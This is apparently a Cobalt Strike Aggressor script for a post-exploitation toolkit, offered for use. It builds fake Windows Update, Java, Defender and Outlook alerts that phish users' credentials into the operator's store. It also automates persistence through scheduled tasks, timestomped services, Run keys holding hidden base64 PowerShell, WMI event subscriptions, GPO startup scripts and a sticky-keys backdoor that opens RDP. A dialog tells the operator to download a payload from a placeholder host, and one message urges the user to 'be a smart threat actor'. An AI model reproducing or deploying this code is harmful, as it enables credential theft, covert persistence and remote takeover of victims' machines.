	drow_text($dialog, "dllpath", "DLL Path: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
}

sub nonjunctionfolderhelp{
	show_message("
	Method:
	    Non-Elevated: Junction Folder

	Description:
	    Creates folder in start menu directory that points to a registry key in HKCU\\Software\\Classes\\CLSID\\<GUID>

	Options:
	    ClassID: CLSID that was generated at installation, only used in cleanup (Optional)
	    DLL Path: DLL location of where the registry value will point to
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes created registry key and folder

	Cleanup Requirements:
	    Cleanup requires the CLSID");
}

sub miscaddschtaskactionhelp{
	show_message("
	Method:
	    Misc: Add Scheduled Task Action

	Description:
	    Adds an action to an existing scheduled task

	Options:
	    Task Name: Scheduled Task name
	    Command: Command to be ran when service is started
	    Task Folder: Folder where task is located (ex: \\Microsoft\\Windows\\Ras)
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes added actions

	Cleanup Requirements:
	    Cleanup requires task name, task folder, and original action's command");
}

sub miscreplacefilehelp{
	show_message("
	Method:
	    Misc: Replace File

	Description:
	    Replaces a file on disk

	Options:
	    File Path: Location where to write a payload to and overwriting file is
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Action: What to do with the file being over written
	    Cleanup: Removes overwritten file and sets original file back, if action is download and remove, select as custom file

	Cleanup Requirements:
	    Cleanup requires the file path and used action");
}

sub miscstartupfolderhelp{
	show_message("
	Method:
	    Misc: Startup Folder

	Description:
	    Writes a file to the starup directory

	Options:
	    File Name: Name of file on disk
	    Startup Directory: Which directory to write the file to
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes written file

	Cleanup Requirements:
	    Cleanup requires the file name and startup directory");
}

sub miscnewlnkhelp{
	show_message("
	Method:
	    Misc: New Lnk

	Description:
	    Creates a new Lnk file on target

	Options:
	    Lnk Path: Location where Lnk will be created at
	    Lnk Name: Name of Lnk
	    Command: What the Lnk will run when executed
	    Lnk Icon: What Icon the Lnk will have (full Windows path)
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes created Lnk

	Cleanup Requirements:
	    Cleanup requires the Lnk name and Lnk path");
}

sub miscbackdoorlnkhelp{
	show_message("
	Method:
	    Misc: BackDoor LNK File

	Description:
	    Modifies the target field of an existing LNK

	Options:
	    Lnk Path: Location where Lnk exists
	    Command: Command to be ran when lnk is executed
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Set Lnk's target back to original value

	Cleanup Requirements:
	    Cleanup requires the Lnk path and command field to be the original command");

			
			
		}
	
	

sub callback {
	
	$bid = %globalsettings['bId'];
	$credbox_title    = $3['Credbox_title'];
	$Toast_type       = $3['Toast_type'];
	$Application_name = $3['Application_name'];
	$Toast_message    = $3['Toast_message'];
	$Toast_title      = $3['Toast_title'];
	$Hide_Process     = $3['Hide_Process'];
	$Credbox_message  = $3['Credbox_message'];

	# compose PS oneliner
	$cmd = "ALert -ToastTitle \"$Toast_title\" -ToastMessage \"$Toast_message\" -Application \"$Application_name\" -credBoxTitle \"$credbox_title\" -credBoxMessage \"$Credbox_message\" -ToastType \"$Toast_type\"";	
	
	# Do we need to hide the process?
	if ($Hide_Process eq "Yes") {
		$cmd = $cmd . " -HideProcesses";
	}
	
	# Load powershell script and execute it			
	bpowershell_import($bid,("/opt/amon-eye/off.c"));
	bpowershell($bid, $cmd);
}

on beacon_output {
	
	$out = $2;
	if ('[+] Username: ' isin $out){
	
		$username = '';
		$password = '';
		
		# Parse output
		@lines = split('\r\n', $out);
		foreach $line (@lines) {
			
			if ('[+] Username: ' isin $line){
				$username = matches($line, '\<ToString\>\[\+\]\sUsername\:\s(.*?)\s\[\+\]\<\/ToString\>')[0];						
			}
			
			if ('[+] Password: ' isin $line){				
				$password = matches($line, '\<ToString\>\[\+\]\sPassword\:\s(.*?)\s\[\+\]\<\/ToString\>')[0];						
			}
		}
		
		if ($username ismatch '.+' || $password ismatch '.+') {
			println("[+] Got credentials");
			println("\tUsername: ".$username)
			println("\tPassword: ".$password)			
			
			# Add to credential store
			if ($username ismatch '.+' && $password ismatch '.+') {
				if ('@' isin $username) {
					$splits = split('@', $username);
					credential_add($splits[0], $password, $splits[1]);
				} else if ('\\' isin $username) {
					$splits = split("\\\\", $username);
					credential_add($splits[1], $password, $splits[0]);
				} else {
					credential_add($username, $password);
				}
			
				println("[+] Added credentials to credential store.");
				blog($1, "\c9 Added credentials for user '".$username."' to the credential store\c9");
			
			} else {
				println("[-] Not enough information to add credentials to AMON-Eye");
				blog($1, "\c4Not enough information to add credentials to AMON-Eye\c4");
			}		
		}			
	} else if ('[-] User did not click on the balloon' isin $out){
		println("[-] user did not click on the balloon.");
		blog($1, "\c4User did not click on the balloon\c4");
	}	
}

sub create_dialog {
	
	$dialog = dialog("Fake Alert Update", %(
		Toast_title => "$1", 
		Toast_message => "$2", 
		Application_name => "$3", 
		Credbox_title => "$4", 
		Credbox_message => "$5", 
		Toast_type => "$6", 
		Hide_Process => "$7"), 
		&callback);
	dialog_description($dialog, "Modify the details below or hit launch");
		
		
	drow_text($dialog, "Toast_title",  "Toast title:");
	drow_text($dialog, "Toast_message", "Toast message:");
	drow_text($dialog, "Application_name", "Application name:");
	drow_text($dialog, "Credbox_title", "Credentialbox title:");
	drow_text($dialog, "Credbox_message", "Credentialbox message:");
	drow_combobox($dialog, "Toast_type", "Toast type:", @("Application","System"));
	drow_combobox($dialog, "Hide_Process", "Hide processes:", @("Yes", "No"));
	
	
	dbutton_action($dialog, "Launch");
	dialog_show($dialog);
}


	### Template for adding more phishing options
	#item " " {		
	#create_dialog("", 	# Toast Title
	#     		  "",	# Toast message
	#			  "",	# Application name (outlook, Update, etc.)
	#			  "",	# Credentialbox title
	#			  "",	# Credentialbox message
	#			  "",	# ToastType (System or Application)
	#			  ""); 	# Hide processes
	#}

	# Store beaconID in a globalvariable. 
	# We change the scope a few times which change the value of $1
	%globalsettings['bId'] = $1;
	

	menu "Fake Alert Update" {

		item " Windows Update - restart pending" {			
			create_dialog("Updates are available", 
						  "Your computer will restart in 5 minutes to install the updates",
						  "Control Panel",
						  "Credentials needed",
						  "Please specify your credentials in order to postpone the updates",
						  "System",
						  "No");
		}
			item " Java - New update available" {		
			create_dialog("Java Update Available", 						
						  "A new version of Java is ready to be installed",	
						  "Configure Java",					
						  "Java Update Checker",				
					      "Please enter your credentials to update Java",	
						  "System",				
						  "No"); 					
		}
		item "Virus and threat protection" {
			create_dialog("Virus and threat protection", 									
						  "Your settings caused Windows Dfender Antivirus to block an app that may potentially perform unwanted actions on your device.",	
						  "Virus & threat protection",										
						  "Virus & threat protection",										
						  "Please enter your credentials for taking action to clean detected malware",						
						  "System",									
						  "Yes"); 										
		}
		item " Outlook - Connection lost" {
			create_dialog("Microsoft Office Outlook", 
						  "Connection to Microsoft Exchange has been lost.`r`nClick here to restore the connection",
						  "Outlook",
						  "Microsoft Outlook",
						  "Enter password for user '{emailaddress|samaccountname}'",
						  "Application",
						  "Yes");
		}
		
		item "Victim Endpoint - taking action" {
	
			create_dialog("Victim Defensive Mechanisms name", 
						  "your endpoint needs to update For the continuity of combating threats",
						  "example: FireEye",
						  "Defensive Mechanisms action name",
						  "Please enter your credentials for taking action",
						  "Application",
						  "No");
						  	show_message("Be a smart threat actor.
		With (AV/EDR Recon or EDR exact query) in the beacons menu
		you can learn the types of victim's defense mechanisms 
		and exploit this to issue an update alert or to take action :-)");
		}
		
	
		separator();
		item " New scenario" {
			create_dialog("","","","","","","");											
		}
	}		

	menu "PsExec/Winrm/SSh" {
		# add our exploits
		local('$exploit @x');
		@x = concat(@("ssh", "ssh-key"), beacon_remote_exploits());
		foreach $exploit (sorta(@x)) {
			item($exploit, lambda({ 
				openJumpDialog($exploit, $1);  
			}, \$exploit));
		}
			item "Golden Ticket" { 			
			local('$bid');
			foreach $bid ($1) {
				openGoldenTicketDialog($bid);
			}
		}
		item "Make T&oken" {
			local('$bid');
			foreach $bid ($1) {
				openMakeTokenDialog($bid);
			}
		}

	}




	separator();
	separator();
	
	item "&BypassUAC - eventvwr" {
		openPayloadHelper(lambda({
			openOrActivate($bids);
			binput($bids, "bypassuac-eventvwr \" $+ $1 $+ \"");
			eventvwr($bids, $1);
		}, $bids => $1));
	}

	item "Active-Evilentry" {
		persistbits($1);
	}
		separator();
		separator();
	
		menu "&Pivoting" {
		item "&SOCKS Server" {
			local('$bid');
			foreach $bid ($1) {
				openSOCKSSetup($bid);
			}
		}

		item "New Listener" { 
			local('$bid');
			foreach $bid ($1) {
				openPivotListenerSetup($bid);
			}
		}
		
		item "&Spawn" { 
		openPayloadHelper(lambda({
			binput($bids, "spawn $1");
			bspawn($bids, $1);
		}, $bids => $1));
	}		
		
 	       item("Proxy Pivots", { openSOCKSBrowser(); });

		
                item "&Browser Pivot" {
			local('$bid');
			foreach $bid ($1) {
				openBrowserPivotSetup($bid);
			}
		}
		item "&Deploy VPN" {
			local('$bid');
			foreach $bid ($1) {
				openCovertVPNSetup($bid);
			}
		}
	}


		menu "&Privilege Escalation"  {

item "&Elevate" { openElevateDialog($1); }
	

item "&One-liner" {
			openOneLinerDialog($1);
		}

		item "&Spawn As"  { 
			local('$bid');
			foreach $bid ($1) {
				openSpawnAsDialog($bid);
			}
		}
       	
		
	}
			separator();

#User Schtasks Persistence
#Author: @r3dQu1nn
#Runs as current user for the selected beacon
#Meant for quick user level persistence upon initial access
#Thanks to @noone and bluescreenofjeff for help

sub persistUserSchtasks  {
	$bid = $1;
	$dialog = dialog("User Schtasks Persistence", %(taskname => "Evil Task Name..", targetpath => "Target Path..", user => "User to Run as..", schedule => "Schedule modifier..", payloadfile => "Select DLL Payload.."), lambda({
		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select DLL Payload..' || "$3['user']" ismatch 'User to Run as..' || "$3['schedule']" ismatch 'Schedule modifier..') {
			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
			break;
		}
		else {
			bcd($bid, $3['targetpath']);
			bupload($bid, $3['payloadfile']);
			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
		}
	}));

	dialog_description($dialog, "User Schtasks Persistence - Generates a schtask for persistence on selected beacon.");
	
	drow_text($dialog, "taskname",  "Schtasks Taskname:");
	drow_text($dialog, "user", "User to Run as:");
	drow_text($dialog, "targetpath", "Target Path:");
	drow_text($dialog, "schedule", "Schedule Modifier:");
	drow_file($dialog, "payloadfile", "DLL Payload:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#Admin Level Custom Service EXE Persistence
#Author: @r3dQu1nn
#Runs as elevated user/SYSTEM for the selected beacon

sub persistCustomService {
	$bid = $1;
	$dialog = dialog("Admin Level Custom Service EXE Persistence", %(servicename => "Custom Service Name..", display => "Display Name for Custom Service..", description => "Description for Custom Service..", targetpath => "Target Path..", payloadfile => "Select Payload.."), lambda({
		if ("$3['servicename']" ismatch 'Custom Service Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['display']" ismatch 'Display Name for Custom Service..' || "$3['description']" ismatch 'Description for Custom Service..' || "$3['payloadfile']" ismatch 'Select Payload..') {
			berror($bid, "\c4Please enter a valid Custom Service Name, Target Path, Display Name, Description and Payload File.");
			break;
		}
		else {
			bcd($bid, $3['targetpath']);
			bupload($bid, $3['payloadfile']);
			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
			bpowerpick($bid, 'sc delete '.$3['servicename'].'');
			bpowerpick($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
			bpowerpick($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
			bpowerpick($bid, 'sc start '.$3['servicename'].'');
		}
	}));
	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
	
	drow_text($dialog, "servicename",  "Custom Service Name:");
	drow_text($dialog, "display", "Display Name for Custom Service:");
	drow_text($dialog, "description", "Description for Custom Service:");
	drow_text($dialog, "targetpath", "Target/Bin Path:");
	drow_file($dialog, "payloadfile", "Payload:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#HKCU Run Key Registry PowerShell Persistence
#Author: @r3dQu1nn
#Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon based off a HTTP/HTTPS Listener
#Big thanks to @christruncer and @merrillmatt011 for the help and code snippets
#Fileless Registry Persistence using PowerShell

sub payloadgenerate {
	foreach $name (listeners()) {
	$original_listener = $name;
        $listener_name = lc($name);
        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {
        	$data = artifact($original_listener, "powershell");
        	return base64_encode($data);
		}
	}
}

sub persistRegistryHKCU {
	$bid = $1;
	$dialog = dialog("HKCU Run Key Registry PowerShell Persistence (User Level)", %(keyname => "Key Name for Payload..", keyname1 => "Key Name to execute Payload.."), lambda({
		if ("$3['keyname']" ismatch 'Key Name for Payload..' || "$3['keyname1']" ismatch 'Key Name to execute Payload..') {
			berror($bid, "\c4Please enter valid Registry Key Names.");
			break;
		}
		else {
			$data = payloadgenerate($bid);
			$powershellcmd = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
			bpowerpick!($bid, $powershellcmd);
			blog($bid, "\cBSetting the first HKCU Run Key Value as '".$3['keyname']."'...");
			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
			bpowerpick!($bid, $powershellcmd1);
			blog($bid, "\cBSetting the second HKCU Run Key Value as '".$3['keyname1']."'...");
			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
			$powershellcmd2 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
			bpowerpick!($bid, $powershellcmd2);
			$powershellcmd3 = "Get-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
			bpowerpick!($bid, $powershellcmd3);
		}
	}));

	dialog_description($dialog, "HKCU Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKCU Run Key Registry Entry for persistence on selected beacon.");
	
	drow_text($dialog, "keyname",  "Registry Key Name for Payload:");
	drow_text($dialog, "keyname1", "Registry Key Name to execute Payload:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#HKLM Run Key Registry PowerShell Persistence
#Author: @r3dQu1nn
#Generates a powershell Base64 Encoded payload as a HKLM Run Key Registry Entry for persistence on selected beacon based off a HTTP/HTTPS Listener

sub payloadgenerate1 {
	foreach $name (listeners()) {
	$original_listener = $name;
        $listener_name = lc($name);
        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {
        	$data = artifact($original_listener, "powershell");
        	return base64_encode($data);
		}
	}
}

sub persistRegistryHKLM {
	$bid = $1;
	$dialog = dialog("HKLM Run Key Registry PowerShell Persistence (User Level)", %(keyname => "Key Name for Payload..", keyname1 => "Key Name to execute Payload.."), lambda({
		if ("$3['keyname']" ismatch 'Key Name for Payload..' || "$3['keyname1']" ismatch 'Key Name to execute Payload..') {
			berror($bid, "\c4Please enter a valid Registry Key Names, Payload, and a valid Path location.");
			break;
		}
		else {
			$data = payloadgenerate1($bid);
			$powershellcmd = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
			bpowerpick!($bid, $powershellcmd);
			blog($bid, "\cBSetting the first HKLM Run Key Value as '".$3['keyname']."'...");
			$powershellcmd1 = "Set-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
			bpowerpick!($bid, $powershellcmd1);
			blog($bid, "\cBSetting the second HKLM Run Key Value as '".$3['keyname1']."'...");
			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
			$powershellcmd2 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."'";
			bpowerpick!($bid, $powershellcmd2);
			$powershellcmd3 = "Get-ItemProperty -Path 'HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."'";
			bpowerpick!($bid, $powershellcmd3);
		}
	}));

	dialog_description($dialog, "HKLM Run Key Registry PowerShell Persistence - Generates a powershell Base64 Encoded payload as a HKLM Run Key Registry Entry for persistence on selected beacon.");
	
	drow_text($dialog, "keyname",  "Registry Key Name for Payload:");
	drow_text($dialog, "keyname1", "Registry Key Name to execute Payload:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#Registry Persistence
#Author: @r3dQu1nn
#Depending on Registry Location elevated access might be required

sub persistRegistry {
	$bid = $1;
	$dialog = dialog("Registry Persistence", %(reglocation => "Registry Location..", keyname => "Key Name..", datatype => "Data Type..(REG_SZ)", keyvalue => "Key Value..(Payload)"), lambda({
		if ("$3['reglocation']" ismatch 'Registry Location..' || "$3['keyname']" ismatch 'Key Name..' || "$3['datatype']" ismatch 'Data Type..(REG_SZ)' || "$3['keyvalue']" ismatch 'Key Value..(Payload)') {
			berror($bid, "\c4Please enter a valid Registry Location, Key Name, Key Type, and a valid Payload Location.");
			break;
		}
		else {
			bpowerpick($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
			bpowerpick($bid, 'reg query "'.$3['reglocation'].'"');
		}
	}));

	dialog_description($dialog, "Registry Persistence - Creates a custom Registry Entry for persistence on selected beacon. **HKLM\\ could require elevated access.");
	
	drow_text($dialog, "reglocation",  "Registry Location:");
	drow_text($dialog, "keyname", "Registry Key Name:");
	drow_text($dialog, "datatype", "Registry Key Type:");
	drow_text($dialog, "keyvalue", "Registry Key Value..(Payload Location):");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#Permanent WMI Event using WMIC Persistence
#Author: @r3dQu1nn
#Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon
#Very syntax heavy, Test first before using on live targets

sub persistwmieventwmic {
	$bid = $1;
	$dialog = dialog("Permanent WMI Event using WMIC Persistence", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", eventconsumer => "CommandLineEventConsumer Name..(Must be different from __EventFilter Name)", commandline => "CommandLineTemplate Syntax..(powershell.exe -w hidden -enc)", payloadfile => "Encoded Payload String.."), lambda({
		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['eventconsumer']" ismatch 'CommandLineEventConsumer Name..(Must be different from __EventFilter Name)' || "$3['commandline']" ismatch 'CommandLineTemplate Syntax..(powershell.exe -w hidden)' || "$3['payloadfile']" ismatch 'Select Encoded Payload..') {
			berror($bid, "\c4Please enter a valid Custom __EventFilter Name, Event Query, CommandLineEventConsumer Name, Command Line Options, and the Encoded Payload File.");
			break;
		}
		else {
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
			bpowerpick($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
		}
	}));
	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
	
	#base 64 encode IEX of the powershell one liner
	#cat payload.txt | iconv --to-code=UTF-16LE | base64
	
	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
	drow_text($dialog, "eventquery", "Custom Event Query:");
	drow_text($dialog, "eventconsumer", "Custom CommandLineEventConsumer Name:");
	drow_text($dialog, "commandline", "Custom Command Line Options:");
	drow_text($dialog, "payloadfile", "Custom Encoded Payload String:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

#Permanent WMI Event using PowerShell Persistence
#Author: @r3dQu1nn
#Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon
#Very syntax heavy, Test first before using on live targets
#Sample Queries:
## User Logon:
#SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2
## System UpTime (Reboot):
#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320
#https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf

sub persistwmievent  {
	$bid = $1;
	if (-is64 $bid) {
		$ExePath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc";
	}
	else {
		$ExePath = "C:\\Windows\\powershell.exe -nop -w hidden -enc";
	}

	$dialog = dialog("Permanent WMI Event Persistence with PowerShell", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", payloadstring => "Encoded Payload String.."), lambda({
		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['payloadstring']" ismatch 'Encoded Payload String..') {
			berror($bid, "\c4Please enter a valid __EventFilter Name, Event Query, and an Encoded Payload String.");
			break;
		}
		else {
			$powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name=\"".$3['eventfilter']."\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"".$3['eventquery']."\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=\"".$3['eventfilter']."\";CommandLineTemplate =\"". $ExePath ." ".$3['payloadstring']."\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
			bpowerpick!($bid, $powershellcmd);
			blog($bid, 'Permanently Storing '.$3['eventfilter'].' in root\CimV2..');
			bpowerpick($bid, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
			bpowerpick($bid, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''.$3['eventfilter'].'\'"');
		}
	}));
	dialog_description($dialog, "Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-16LE, base64 encoded and under 1MB.**");
	
	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
	drow_text($dialog, "eventquery", "Custom Event Query:");
	drow_text($dialog, "payloadstring", "Custom Encoded Payload String:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);
}

#Startup Script Local GPO Persistence
#Author: @r3dQu1nn
#Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon 
#Calls back as SYSTEM 
#**Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**
#**Beacon execution will cause winlogon.exe to hang and the end user can't login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.**
#https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/

sub persistStartupGPO  {

	$bid = $1;
	$dialog = dialog("Startup Script Local GPO Persistence", %(scriptfile => "Select PS1 Script File.."), lambda({
		if ("$3['scriptfile']" ismatch 'Select PS1 Script File..') {
			berror($bid, "\c4Please enter a valid Script Path, and .ps1 Script File.");
			break;
		}
		else {
			bcd($bid, "C:\\");
			bupload($bid, $3['scriptfile']);
			$handle = openf(">psscripts.ini");
			writeb($handle, "[ScriptsConfig]\nStartExecutePSFirst=true\n[Startup]\n0CmdLine=".split("/",$3['scriptfile'])[-1]."\n0Parameters=");
			closef($handle);
			bpowerpick($bid, 'Move-Item -force -path C:\\'.split("/",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');
			bupload($bid, script_resource("psscripts.ini"));
			bpowerpick($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');
			bpowerpick($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');
			bpowerpick($bid, 'gpupdate /force');
		}
	}));

	dialog_description($dialog, "Startup Script Local GPO Persistence - Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon. **Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**");
	
	drow_file($dialog, "scriptfile", ".ps1 Script File:");
	
	dbutton_action($dialog, "Create");
	dialog_show($dialog);

}

sub stickykeys {

	bpowerpick($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
	bpowerpick($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
	bpowerpick($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
	bpowerpick($1, 'netsh firewall set service type = remotedesktop mode = enable');
	bpowerpick($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
	bpowerpick($1, 'net start TermService');

}

sub persistThroughStartUpFolder {
	$bid = $1;
	$dialog = dialog("Start Up Folder Persistence", %(startup => "Startup Directory Folder..", payload => "Select Payload.."), lambda({
		if ("$3['startup']" ismatch 'Startup Directory Folder..' || "$3['payload']" ismatch 'Select Payload..') {
			berror($bid, "\c4Please enter a valid Startup Directory Folder, and select a Payload.");
			break;
		}
		else {
			bpowerpick($bid, 'cd "'.$3['startup'].'"');
			bupload($bid, $3['payload']);
			btimestomp($bid, "$3['payload']", "c:\\windows\\system32\\calc.exe");	
		}
	}));
	dialog_description($dialog, "Start Up Folder Persistence - Generates a Startup Folder Entry and places a payload inside that folder. **Windows NT 6.0-10.0/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT 6.0-10.0/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");

	drow_text($dialog, "startup", "StartUp Directory Folder Location:");
